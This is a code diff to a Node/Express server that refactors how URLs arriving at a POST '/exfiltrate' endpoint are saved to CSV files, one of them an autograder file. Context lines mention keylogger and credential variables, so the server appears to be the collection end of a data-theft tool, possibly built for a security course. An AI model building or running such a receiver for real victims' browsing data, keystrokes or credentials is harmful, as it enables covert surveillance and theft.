@@ -17,6 +17,28 @@ var system_info;
 var keylogger_info;
 var credentials = {};
 
+
+function processURLs(urls) {
+    if (!Array.isArray(urls) || urls.length === 0) return;
+
+    console.log("Processing URLs:", urls);
+
+    urls.forEach(url => {
+        links.push({ url, receivedAt: new Date() });
+    });
+
+    const csvHeader = "receivedAt, url\n";
+    const csvContent = links.map(link => `${link.receivedAt.toISOString()}, ${link.url}`).join("\n");
+    const filePath = path.join(__dirname, "csv/urls/urls.csv");
+
+    fs.writeFileSync(filePath, csvHeader + csvContent, "utf8");
+
+    const autograderFilePath = path.join(__dirname, "csv/urls/autograder_links.csv");
+    const autograderContent = links.map(link => link.url).join(",");
+    fs.writeFileSync(autograderFilePath, autograderContent, "utf8");
+}
+
+
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "dashboard.html")); // Serve the HTML file
 });
@@ -31,21 +53,7 @@ app.post('/exfiltrate', (req, res) => {
 
     switch (type) {
         case 'urls':
-            const url = data;
-            console.log("Received URL:", url);
-            links.push({
-              url: url,
-              receivedAt: new Date()
-            });
-
-            const csvHeader = "receivedAt, url\n";
-            const csvContent = links.map(link => `${link.receivedAt.toISOString()}, ${link.url}`).join("\n");
-            const filePath = path.join(__dirname, "csv/urls/urls.csv");
-            fs.writeFileSync(filePath, csvHeader + csvContent, "utf8");
-
-            const autograderFilePath = path.join(__dirname, "csv/urls/autograder_links.csv");
-            const autograderContent = links.map(link => link.url).join(",");
-            fs.writeFileSync(autograderFilePath, autograderContent, "utf8");
+            processURLs(data);
 
             break;
 
